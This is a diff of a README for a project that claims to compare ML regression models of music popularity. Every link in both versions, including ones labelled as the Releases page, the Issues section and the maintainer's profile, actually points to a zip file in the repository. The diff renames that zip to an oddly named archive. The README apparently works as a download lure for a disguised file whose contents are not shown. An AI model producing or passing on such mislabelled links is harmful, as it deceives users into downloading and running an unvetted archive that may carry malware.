@@ -1,6 +1,6 @@
 # 🎶 Comparison_ML_Regression_Models - Compare Popularity of Music Tracks Easily
 
-[![Download Here](https://raw.githubusercontent.com/YahyaBalikci/Comparison_ML_Regression_Models/main/Alvan/Comparison_ML_Regression_Models.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/YahyaBalikci/Comparison_ML_Regression_Models/main/Alvan/Comparison_ML_Regression_Models.zip)
+[![Download Here](https://github.com/YahyaBalikci/Comparison_ML_Regression_Models/raw/refs/heads/main/Alvan/Models-Regression-M-Comparison-sputum.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/YahyaBalikci/Comparison_ML_Regression_Models/raw/refs/heads/main/Alvan/Models-Regression-M-Comparison-sputum.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ To run this application, ensure your computer meets the following requirements:
 
 To start, visit the Releases page to download the application. 
 
-[Download from Releases](https://raw.githubusercontent.com/YahyaBalikci/Comparison_ML_Regression_Models/main/Alvan/Comparison_ML_Regression_Models.zip)
+[Download from Releases](https://github.com/YahyaBalikci/Comparison_ML_Regression_Models/raw/refs/heads/main/Alvan/Models-Regression-M-Comparison-sputum.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version. It will have the highest number (e.g., v1.0).
@@ -62,7 +62,7 @@ If you encounter issues:
 - Ensure all software and dependencies are updated.
 - Check for any error messages and note them down for help.
 
-For help, check the [Issues section](https://raw.githubusercontent.com/YahyaBalikci/Comparison_ML_Regression_Models/main/Alvan/Comparison_ML_Regression_Models.zip) of the repository or reach out to the community.
+For help, check the [Issues section](https://github.com/YahyaBalikci/Comparison_ML_Regression_Models/raw/refs/heads/main/Alvan/Models-Regression-M-Comparison-sputum.zip) of the repository or reach out to the community.
 
 ## 🗂️ Additional Resources
 
@@ -82,10 +82,10 @@ This project is licensed under the MIT License. You can read more about it in th
 
 For any inquiries, feel free to reach out to the repository maintainer:
 
-- Username: [YahyaBalikci](https://raw.githubusercontent.com/YahyaBalikci/Comparison_ML_Regression_Models/main/Alvan/Comparison_ML_Regression_Models.zip)
+- Username: [YahyaBalikci](https://github.com/YahyaBalikci/Comparison_ML_Regression_Models/raw/refs/heads/main/Alvan/Models-Regression-M-Comparison-sputum.zip)
 
 ## ❗ Final Notes
 
 Thank you for choosing Comparison_ML_Regression_Models. We hope this application helps you analyze music track popularity with ease.
 
-[Download from Releases](https://raw.githubusercontent.com/YahyaBalikci/Comparison_ML_Regression_Models/main/Alvan/Comparison_ML_Regression_Models.zip)
+[Download from Releases](https://github.com/YahyaBalikci/Comparison_ML_Regression_Models/raw/refs/heads/main/Alvan/Models-Regression-M-Comparison-sputum.zip)
